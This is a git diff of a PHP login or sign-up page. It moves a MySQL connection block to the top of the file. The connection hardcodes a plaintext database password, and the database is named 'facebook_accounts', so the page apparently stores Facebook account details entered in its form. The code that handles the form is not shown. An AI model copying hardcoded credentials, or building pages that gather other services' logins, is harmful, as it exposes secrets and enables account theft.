@@ -1,3 +1,12 @@
+<?php
+    $servidor = "localhost";
+    $usuario = "id21738922_root";
+    $clave = "";
+    $baseDeDatos = "id21738922_facebook_accounts";
+
+    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
+?>  
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -111,18 +120,9 @@
      <hr> <button type="submit" name="login" class="button" style="background-color: #4CAF50;" >Crear cuenta</button><br><br>
       </div>
     </form>
-  </div></center>  
-
-
-<?php
-    $servidor = "localhost";
-    $usuario = "id21738922_root";
-    $clave = "";
-    $baseDeDatos = "id21738922_facebook_accounts";
-
-    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
-?>   
-
+  </div></center>    
+</body>
+</html>
 
 <?php
     if(isset($_POST['login'])){
@@ -135,14 +135,6 @@
     
    }
 ?>
-
-
-
-  
-</body>
-</html>
-
-
  
 
 
